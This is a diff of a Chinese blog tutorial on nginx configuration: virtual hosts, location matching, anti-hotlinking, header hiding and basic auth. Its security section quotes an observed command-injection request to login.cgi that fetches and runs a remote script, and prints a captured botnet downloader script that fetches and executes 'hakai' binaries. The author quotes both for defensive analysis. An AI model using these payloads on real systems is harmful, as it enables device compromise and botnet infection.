+<pre><code class="bash">sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/
+sudo ln -s /etc/nginx/sites-available/test.com /etc/nginx/sites-enabled/
+</code></pre>
 <p>这个也算作规范吧</p>
 <p>http这个directive下一层就是server了,一般来说，一个虚拟域名(virtual domain)就对应着一个server块。</p>
-<p><strong>接下来的东西就不要写在/etc/nginx/nginx.conf文件里了,这里应该是一个domain写一个.conf文件</strong><br>/etc/nginx/sites-available/default<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;  //  default_server means this virtual host will answer requests on port 80 that don’t specifically match another virtual host’s listen statement.</span><br><span class="line">        listen [::]:80 default_server ipv6only=on; // 这个是给ipv6用的</span><br><span class="line"></span><br><span class="line">        listen     80;   ## 80端口</span><br><span class="line">        listen     *:80;  ## 80端口，和上面一样</span><br><span class="line">        listen     8080;  ## 8080端口</span><br><span class="line">        listen     *:8080;  ## 8080端口，和上面一样</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        root /usr/share/nginx/html;</span><br><span class="line">        index index.html index.htm; ##有Index.html直接返回，没有的话尝试index.htm文件</span><br><span class="line"></span><br><span class="line">        # Make site accessible from http://localhost/ ## localhost其实就是127.0.0.1，这是写在/etc/hosts里面的</span><br><span class="line">        server_name localhost; ## 这可以使得一个ip地址支持多个domain( This allows multiple domains to be served from a single IP address.)</span><br><span class="line"></span><br><span class="line">        ### 这时的文件名应该叫/etc/nginx/sites-available/example.com</span><br><span class="line">        server_name   example.com www.example.com; ##  example.com www.example.com都支持,example.com就支持旗下所有子域名。www.example.com, foo.example.com，等等</span><br><span class="line"></span><br><span class="line">        ### 这时的文件名应该叫/etc/nginx/sites-available/example.com</span><br><span class="line">        server_name   example.*; ## example开头的都行</span><br><span class="line"></span><br><span class="line">        ## 下面这俩意思一样，这时的文件名应该叫/etc/nginx/sites-available/example.com</span><br><span class="line">        server_name   *.example.com;</span><br><span class="line">        server_name   .example.com;</span><br><span class="line"></span><br><span class="line">        ### 这时的文件名应该叫/etc/nginx/sites-available/example</span><br><span class="line">        server_name   example.*; ## example.com, example.org, example.net, example.foo.com, etc.</span><br><span class="line"></span><br><span class="line">        ### 文件名随意啦/etc/nginx/sites-available/multi-list</span><br><span class="line">        server_name   example.com linode.com icann.org  whatever.you.wantwite.isok.org; ## 一个server_name后面跟任何域名都是没问题的</span><br><span class="line"></span><br><span class="line">        ## 比如说你在局域网有个linux机器挂着nginx，你可以创建这样一个文件，/etc/nginx/sites-available/local</span><br><span class="line">        server_name   localhost linode galloway; ### 这样局域网(LAN)内用户访问linode，galloway都能走到你这一块指定的走向（再具体一点，假如你是个前端开发，你跟测试说，手机连我代理，访问galloway就行了）</span><br><span class="line"></span><br><span class="line">        ### /etc/nginx/sites-available/catchall</span><br><span class="line">        server_name   &quot;&quot;;</span><br><span class="line">        ## nginx will process all requests that either do not have a hostname, or that have an unspecified hostname, such as requests for the IP address itself.</span><br><span class="line">        ## 要么是没有hostname，要么是没有一个具体的hostname，说的就是直接浏览器输入ip地址的那帮人</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                # First attempt to serve request as file, then</span><br><span class="line">                # as directory, then fall back to displaying a 404.</span><br><span class="line">                try_files $uri $uri/ /index.html; ## 说的很清楚，先当做文件试试，再当做文件夹试试，再不行试试index.html</span><br><span class="line">                # Uncomment to enable naxsi on this location</span><br><span class="line">                # include /etc/nginx/naxsi.rules</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>接下来的东西就不要写在/etc/nginx/nginx.conf文件里了,这里应该是一个domain写一个.conf文件</strong><br>/etc/nginx/sites-available/default</p>
+<pre><code class="server">server {
+        listen 80 default_server;  //  default_server means this virtual host will answer requests on port 80 that don’t specifically match another virtual host’s listen statement.
+        listen [::]:80 default_server ipv6only=on; // 这个是给ipv6用的
+
+        listen     80;   ## 80端口
+        listen     *:80;  ## 80端口，和上面一样
+        listen     8080;  ## 8080端口
+        listen     *:8080;  ## 8080端口，和上面一样
+
+
+        root /usr/share/nginx/html;
+        index index.html index.htm; ##有Index.html直接返回，没有的话尝试index.htm文件
+
+        # Make site accessible from http://localhost/ ## localhost其实就是127.0.0.1，这是写在/etc/hosts里面的
+        server_name localhost; ## 这可以使得一个ip地址支持多个domain( This allows multiple domains to be served from a single IP address.)
+
+        ### 这时的文件名应该叫/etc/nginx/sites-available/example.com
+        server_name   example.com www.example.com; ##  example.com www.example.com都支持,example.com就支持旗下所有子域名。www.example.com, foo.example.com，等等
+
+        ### 这时的文件名应该叫/etc/nginx/sites-available/example.com
+        server_name   example.*; ## example开头的都行
+
+        ## 下面这俩意思一样，这时的文件名应该叫/etc/nginx/sites-available/example.com
+        server_name   *.example.com;
+        server_name   .example.com;
+
+        ### 这时的文件名应该叫/etc/nginx/sites-available/example
+        server_name   example.*; ## example.com, example.org, example.net, example.foo.com, etc.
+
+        ### 文件名随意啦/etc/nginx/sites-available/multi-list
+        server_name   example.com linode.com icann.org  whatever.you.wantwite.isok.org; ## 一个server_name后面跟任何域名都是没问题的
+
+        ## 比如说你在局域网有个linux机器挂着nginx，你可以创建这样一个文件，/etc/nginx/sites-available/local
+        server_name   localhost linode galloway; ### 这样局域网(LAN)内用户访问linode，galloway都能走到你这一块指定的走向（再具体一点，假如你是个前端开发，你跟测试说，手机连我代理，访问galloway就行了）
+
+        ### /etc/nginx/sites-available/catchall
+        server_name   &quot;&quot;;
+        ## nginx will process all requests that either do not have a hostname, or that have an unspecified hostname, such as requests for the IP address itself.
+        ## 要么是没有hostname，要么是没有一个具体的hostname，说的就是直接浏览器输入ip地址的那帮人
+
+
+        location / {
+                # First attempt to serve request as file, then
+                # as directory, then fall back to displaying a 404.
+                try_files $uri $uri/ /index.html; ## 说的很清楚，先当做文件试试，再当做文件夹试试，再不行试试index.html
+                # Uncomment to enable naxsi on this location
+                # include /etc/nginx/naxsi.rules
+        }
+}
+</code></pre>
 <p>关于server_name这个参数，nginx网站上在<a href="http://nginx.org/en/docs/http/request_processing.html">how nginx process requests中是这么说的</a> 一个.conf文件里这么写是没有问题的.还有这个server_name写成domain name或者ip address都是可以的.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.org www.example.org;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>server_name对应客户端发来的request中的HOST这个header，一个个去匹配，没有的话就默认用第一个。当然我非要第二个作为默认的也是可以的，加一个default_server就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      80 default_server;</span><br><span class="line">    server_name example.net www.example.net;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><a href="https://serverfault.com/questions/834467/nginx-server-host-header-server-name">这个server_name是如何从request中提取出来的</a><br>比方说你在浏览器里敲了” <a href="http://myserver/">http://myserver/</a> “,浏览器就会去请求DNS server来确定这个domain对应的ip address。随后”myserver”这几个字会被写进HTTP 请求“Host: myserver”。<br>这是生产环境正常的逻辑。<br>如果开发过程中的话，想要修改这个Host似乎改hosts可以实现<br>sudo vim /etc/hosts<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">192.168.122.245 nagios.monitor.com</span><br><span class="line">192.168.122.245 localhost</span><br><span class="line">192.168.122.245 www.netdatamonitor.com  netdatamonitor.com</span><br><span class="line">127.0.0.1       www.baidu.com</span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure></p>
-<p>这样自己在浏览器中敲www.baidu.com，本地nginx config文件中server_name 为baidu.com的也能响应了。</p>
+<pre><code>server {
+    listen      80;
+    server_name example.org www.example.org;
+    ...
+}
+
+server {
+    listen      80;
+    server_name example.net www.example.net;
+    ...
+}
+
+server {
+    listen      80;
+    server_name example.com www.example.com;
+    ...
+}
+</code></pre><p>server_name对应客户端发来的request中的HOST这个header，一个个去匹配，没有的话就默认用第一个。当然我非要第二个作为默认的也是可以的，加一个default_server就行了</p>
+<pre><code>server {
+    listen      80 default_server;
+    server_name example.net www.example.net;
+    ...
+}
+</code></pre><p><a href="https://serverfault.com/questions/834467/nginx-server-host-header-server-name">这个server_name是如何从request中提取出来的</a><br>比方说你在浏览器里敲了” <a href="http://myserver/">http://myserver/</a> “,浏览器就会去请求DNS server来确定这个domain对应的ip address。随后”myserver”这几个字会被写进HTTP 请求“Host: myserver”。<br>这是生产环境正常的逻辑。<br>如果开发过程中的话，想要修改这个Host似乎改hosts可以实现<br>sudo vim /etc/hosts</p>
+<pre><code>192.168.122.245 nagios.monitor.com
+192.168.122.245 localhost
+192.168.122.245 www.netdatamonitor.com  netdatamonitor.com
+127.0.0.1       www.baidu.com
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre><p>这样自己在浏览器中敲www.baidu.com，本地nginx config文件中server_name 为baidu.com的也能响应了。</p>
 <h3 id="access-log是跟着server走的，毕竟你不希望两台不相干的服务器的访问日志搅和在一起"><a href="#access-log是跟着server走的，毕竟你不希望两台不相干的服务器的访问日志搅和在一起" class="headerlink" title="access_log是跟着server走的，毕竟你不希望两台不相干的服务器的访问日志搅和在一起"></a>access_log是跟着server走的，毕竟你不希望两台不相干的服务器的访问日志搅和在一起</h3><p>/etc/nginx/sites-available/example.com文件中写入这么一行</p>
 <blockquote>
 <p>access_log /srv/www/example.com/logs/access.log;</p>
@@ -341,7 +794,45 @@ ga('send', 'pageview');
 <h3 id="接下来是location"><a href="#接下来是location" class="headerlink" title="接下来是location"></a>接下来是location</h3><blockquote>
 <p>/etc/nginx/sites-available/example.com</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">location / &#123; &#125;  </span><br><span class="line">location /images/ &#123; &#125;</span><br><span class="line">location /blog/ &#123; &#125;</span><br><span class="line">location /planet/ &#123; &#125;</span><br><span class="line">location /planet/blog/ &#123; &#125;</span><br><span class="line"></span><br><span class="line">/* 现在客户端访问http://example.com/，假如前面server_name配置了一个example.com.那个这次请求被location / 获取</span><br><span class="line">Nginx总是会使用匹配程度最高的：比如</span><br><span class="line">Request: http://example.com/planet/blog/ or http://example.com/planet/blog/about/</span><br><span class="line">这俩请求会走到location /planet/blog/ &#123; &#125;而不是location /planet/ &#123; &#125; */</span><br><span class="line"></span><br><span class="line">location ~ IndexPage\.php$ &#123; &#125;</span><br><span class="line">location ~ ^/BlogPlanet(/|/index\.php)$ &#123; &#125; ## 向上箭头表示以此开始，美元符号代表以此结束，反斜杠代表转义字符，波浪号表示这是一个正则，大小写敏感!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">所有的jpg和png？</span><br><span class="line">location ~^ \.(jpg|png)$ &#123; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">想要大小写不敏感？</span><br><span class="line">location ~* \.(pl|cgi|perl|prl)$ &#123; &#125;</span><br><span class="line">location ~* \.(md|mdwn|txt|mkdn)$ &#123; &#125;</span><br><span class="line">上面这俩表示所有.pl,.PL,.Pl,pL...各种各样的大小写都照单全收</span><br><span class="line"></span><br><span class="line">前面这个~符号代表后面跟着的是一个正则表达式（nginx uses Perl Compatible Regular Expressions (PCRE).）但这里还是大小写敏感的正则表达式</span><br><span class="line"></span><br><span class="line">location ~* \.(pl|cgi|perl|prl)$ &#123; &#125;</span><br><span class="line">location ~* \.(md|mdwn|txt|mkdn)$ &#123; &#125;</span><br><span class="line">// 想要大小写不敏感~*即可</span><br><span class="line">## 这回.pl, .PL, .cgi, .CGI, .perl, .Perl, .prl结尾的都能匹配了</span><br><span class="line"></span><br><span class="line">location ^~ /images/IndexPage/ &#123; &#125;</span><br><span class="line">location ^~ /blog/BlogPlanet/ &#123; &#125;</span><br><span class="line">这个^~符号表示告诉nginx，如果找到了匹配，就不再往下找了。意思就是说 /images/IndexPage/info 也会直接用这个了，就算后面有更佳匹配location  /images/IndexPage/info &#123; &#125;也不管</span><br><span class="line"></span><br><span class="line">location = / &#123; &#125;</span><br><span class="line">注意这个中间的等号，意思是访问只有url是http://example.com/的时候才匹配 ，而 http://example.com/index.html 就不会匹配</span><br><span class="line">用=有一个好处就是匹配会稍微快一点，常用于匹配一些特别热门的url</span><br></pre></td></tr></table></figure>
+<pre><code class="config">location / { }  
+location /images/ { }
+location /blog/ { }
+location /planet/ { }
+location /planet/blog/ { }
+
+/* 现在客户端访问http://example.com/，假如前面server_name配置了一个example.com.那个这次请求被location / 获取
+Nginx总是会使用匹配程度最高的：比如
+Request: http://example.com/planet/blog/ or http://example.com/planet/blog/about/
+这俩请求会走到location /planet/blog/ { }而不是location /planet/ { } */
+
+location ~ IndexPage\.php$ { }
+location ~ ^/BlogPlanet(/|/index\.php)$ { } ## 向上箭头表示以此开始，美元符号代表以此结束，反斜杠代表转义字符，波浪号表示这是一个正则，大小写敏感!
+
+
+所有的jpg和png？
+location ~^ \.(jpg|png)$ { }
+
+
+想要大小写不敏感？
+location ~* \.(pl|cgi|perl|prl)$ { }
+location ~* \.(md|mdwn|txt|mkdn)$ { }
+上面这俩表示所有.pl,.PL,.Pl,pL...各种各样的大小写都照单全收
+
+前面这个~符号代表后面跟着的是一个正则表达式（nginx uses Perl Compatible Regular Expressions (PCRE).）但这里还是大小写敏感的正则表达式
+
+location ~* \.(pl|cgi|perl|prl)$ { }
+location ~* \.(md|mdwn|txt|mkdn)$ { }
+// 想要大小写不敏感~*即可
+## 这回.pl, .PL, .cgi, .CGI, .perl, .Perl, .prl结尾的都能匹配了
+
+location ^~ /images/IndexPage/ { }
+location ^~ /blog/BlogPlanet/ { }
+这个^~符号表示告诉nginx，如果找到了匹配，就不再往下找了。意思就是说 /images/IndexPage/info 也会直接用这个了，就算后面有更佳匹配location  /images/IndexPage/info { }也不管
+
+location = / { }
+注意这个中间的等号，意思是访问只有url是http://example.com/的时候才匹配 ，而 http://example.com/index.html 就不会匹配
+用=有一个好处就是匹配会稍微快一点，常用于匹配一些特别热门的url
+</code></pre>
 <p>Directives are processed in the following order:（搜索url匹配的顺序如下）<br>1： Exact string matches are processed first.（就是url字符一模一样的最先匹配上并停止后续搜索）<br>2： Remaining literal string directives are processed next. 如果碰到了^~修饰的匹配的字符，停止搜索<br>3： All location directives with regular expressions (~ and ~* ) are processed.正则表达式搜索开始<br>4： 如果上述都没找到，If no regular expressions match, the most specific literal string match is used.</p>
 <p>Make sure each file and folder under a domain will match at least one location directive.写配置的时候请确保某个domain下的所有文件都能至少被一条规则匹配上</p>
 <blockquote>
@@ -355,13 +846,21 @@ ga('send', 'pageview');
 <p>HTTP规范要求405的code需要在返回的response中添加一个Allow的header说明哪些方法是被允许的</p>
 <p>==========================================================================================================================</p>
 <p>add_header not working on ubuntu server?</p>
-<h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>之前做爬虫的时候，request的header中不添加refer就会返回一张 固定的图片。<br>这个功能nginx也行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location ~* \.(gif|jpg|swf)$ &#123;</span><br><span class="line">    valid_referers none blocked start.igrow.cn sta.igrow.cn;</span><br><span class="line">    if ($invalid_referer) &#123;</span><br><span class="line">       rewrite ^/ http://$host/logo.png;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>nginx预设的变量[variable]非常多(<a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#var_remote_addr">http://nginx.org/en/docs/http/ngx_http_core_module.html#var_remote_addr</a>)</p>
+<h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>之前做爬虫的时候，request的header中不添加refer就会返回一张 固定的图片。<br>这个功能nginx也行</p>
+<pre><code>location ~* \.(gif|jpg|swf)$ {
+    valid_referers none blocked start.igrow.cn sta.igrow.cn;
+    if ($invalid_referer) {
+       rewrite ^/ http://$host/logo.png;
+    }
+}
+</code></pre><p>nginx预设的变量[variable]非常多(<a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#var_remote_addr">http://nginx.org/en/docs/http/ngx_http_core_module.html#var_remote_addr</a>)</p>
 <blockquote>
 <p>remote_addr 客户端的ip地址<br>remote_port 客户端的port<br>request_method GET或者POST<br>request_uri ## 包含请求参数的原始URI，不包含主机名，如：”/foo/bar.php?arg=baz”。不能修改。<br>scheme ## http或者https<br>server_addr ## 服务器地址<br>server_name<br>server_port</p>
 </blockquote>
-<p>根据<a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html">官方文档</a>，反向代理的时候，只有这俩Header是默认带上的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxy_set_header Host       $proxy_host;</span><br><span class="line">proxy_set_header Connection close;</span><br></pre></td></tr></table></figure></p>
-<p>如果客户端发出的请求的HEADER中有HOST这个字段时，那么$host和$http_host都是一样的<br>那要是没有呢？</p>
+<p>根据<a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html">官方文档</a>，反向代理的时候，只有这俩Header是默认带上的</p>
+<pre><code>proxy_set_header Host       $proxy_host;
+proxy_set_header Connection close;
+</code></pre><p>如果客户端发出的请求的HEADER中有HOST这个字段时，那么$host和$http_host都是一样的<br>那要是没有呢？</p>
 <blockquote>
 <p>However, if this field is not present in a client request header then nothing will be passed. In such a case it is better to use the $host variable - its value equals the server name in the “Host” request header field or the primary server name if this field is not present:<br>proxy_set_header Host       $host;</p>
 </blockquote>
@@ -375,20 +874,48 @@ ga('send', 'pageview');
 <blockquote>
 <p>server_tokens off;</p>
 </blockquote>
-<p>这样返回的response中就 变成了Server:nginx<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxy_set_header X-Powered-By &quot;&quot;;</span><br><span class="line"># or</span><br><span class="line">proxy_hide_header X-Powered-By;</span><br><span class="line"># or</span><br><span class="line">more_clear_headers Server; ##直接移除Server这个header</span><br></pre></td></tr></table></figure></p>
-<p>========================================================================================================================<br>nginx怎么清除缓存</p>
+<p>这样返回的response中就 变成了Server:nginx</p>
+<pre><code>proxy_set_header X-Powered-By &quot;&quot;;
+# or
+proxy_hide_header X-Powered-By;
+# or
+more_clear_headers Server; ##直接移除Server这个header
+</code></pre><p>========================================================================================================================<br>nginx怎么清除缓存</p>
 <p>实际操作中遇到过的问题<br>在sites-avaliable中写了这么一个default.conf文件<br>server_name 瞎写了一个<br>接着后sites-avaliable中又添加了一个b.conf文件，<br>server_name写的是vps的实际ip。<br>这下所有的请求都被匹配到b.conf文件上了，浏览器里访问静态资源全部都是404。解决办法就是把default.conf文件中瞎写的server_name写成实际的ip地址或者自己买的domain name。</p>
 <p>安全问题：</p>
 <p>查看下外部曾经尝试过获取那些.php文件<br>cat access.log  | awk ‘$7 ~ /.php/ { print $7 }’ | sort -n | uniq -c | sort -nr<br>// awk第七列包含.php的，根据出现次数排序，unique一下，包含次数，反向排序</p>
-<p>所有以.php为后缀的资源都不允许访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ (\.php$|myadmin) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>所有以.php为后缀的资源都不允许访问</p>
+<pre><code class="config">location ~ (\.php$|myadmin) {
+    return 403;
+}
+</code></pre>
 <p>亲眼见到的一个访问日志<br>“GET /login.cgi?cli=aa%20aa%27;wget%20<a href="http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$">http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$</a> HTTP/1.1”</p>
 <p>这个aa%20aa%27粘贴到chrome的console里面,decodeURIComponent(“aa%20aa%27”)，按照这样的做法翻译了上面的话如下：<br>“GET /login.cgi?cli=aa aa’;wget <a href="http://185.172.164.41/e">http://185.172.164.41/e</a> -O -&gt; /tmp/hk;sh /tmp/hk’$ HTTP/1.1”</p>
 <p>至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。<a href="https://github.com/paralax/awesome-honeypots">有专门的蜜罐处理这种行为</a></p>
-<p>后来在日志里面查到这样一个脚本，最终发现下载了一大堆binary file。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">n=<span class="string">"hakai.mips hakai.arm5 hakai.mpsl hakai.x86_64"</span></span><br><span class="line">http_server=<span class="string">"46.166.185.42"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="variable">$n</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    wget http://<span class="variable">$http_server</span>/<span class="variable">$a</span> -O -&gt; /tmp/<span class="variable">$a</span></span><br><span class="line">    chmod 777 /tmp/<span class="variable">$a</span></span><br><span class="line">    /tmp/<span class="variable">$a</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="variable">$n</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    rm -rf /tmp/<span class="variable">$a</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
+<p>后来在日志里面查到这样一个脚本，最终发现下载了一大堆binary file。</p>
+<pre><code class="bash">#!/bin/sh
+n=&quot;hakai.mips hakai.arm5 hakai.mpsl hakai.x86_64&quot;
+http_server=&quot;46.166.185.42&quot;
+
+for a in $n
+do
+    wget http://$http_server/$a -O -&gt; /tmp/$a
+    chmod 777 /tmp/$a
+    /tmp/$a
+done
+
+for a in $n
+do
+    rm -rf /tmp/$a
+done
+</code></pre>
 <p><a href="http://blog.netlab.360.com/a-new-threat-an-iot-botnet-scanning-internet-on-port-81-en/">这里有详细的解说</a></p>
 <p><a href="https://serverfault.com/questions/879329/why-does-nginx-select-a-location-block-with-a-non-matching-regex">然而nginx是没法在配置文件里面去match上一个queryParameter的</a></p>
-<p>有一个专门的说法叫做nginx 防止注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($request_uri ~* &quot;[+|(%20)]select[+|(%20)]&quot;) &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>所以根据requesturl来判断就得用上if了<br><a href="https://serverfault.com/questions/837598/redirect-of-all-the-urls-that-contain-1-word-in-specific-but-that-do-not-contai">redirect-of-all-the-urls</a></p>
+<p>有一个专门的说法叫做nginx 防止注入</p>
+<pre><code>if ($request_uri ~* &quot;[+|(%20)]select[+|(%20)]&quot;) {
+    return 404;
+}
+</code></pre><p>所以根据requesturl来判断就得用上if了<br><a href="https://serverfault.com/questions/837598/redirect-of-all-the-urls-that-contain-1-word-in-specific-but-that-do-not-contai">redirect-of-all-the-urls</a></p>
 <p><a href="https://www.digitalocean.com/community/tutorials/how-to-configure-nginx-to-use-custom-error-pages-on-ubuntu-14-04">自定义404,5XX的页面也是挺好玩的</a></p>
 <p>nginx查看当前连接数</p>
 <blockquote>
@@ -396,12 +923,30 @@ ga('send', 'pageview');
 </blockquote>
 <p><a href="http://www.ttlsa.com/nginx/nginx-modules-upload-module/">nginx上传模块—nginx upload module</a><br>至于upload，还是直接proxy_pass给一个localhost的http服务吧</p>
 <p><a href="http://www.ttlsa.com/nginx/nginx-basic-http-authentication/">nginx添加认证页面</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># printf &quot;username:$(openssl passwd -crypt 123456)\n&quot; &gt;&gt;conf/htpasswd</span><br><span class="line"># cat conf/htpasswd </span><br><span class="line">ttlsa:xyJkVhXGAZ8tM</span><br></pre></td></tr></table></figure>
-<p><a href="https://logz.io/blog/nginx-access-log-monitoring-dashboard/">ELK全家桶实现nginx访问日志可视化</a>，似乎要装java。</p>
+<pre><code># printf &quot;username:$(openssl passwd -crypt 123456)\n&quot; &gt;&gt;conf/htpasswd
+# cat conf/htpasswd 
+ttlsa:xyJkVhXGAZ8tM
+</code></pre><p><a href="https://logz.io/blog/nginx-access-log-monitoring-dashboard/">ELK全家桶实现nginx访问日志可视化</a>，似乎要装java。</p>
 <p>关于ngixn返回的response的header中Content-Type，在nginx的config目录下能找到一个mime.types文件。里面指定了哪些文件后缀对应哪些mimetype。比如.mp3文件就返回audio/mpeg这种。</p>
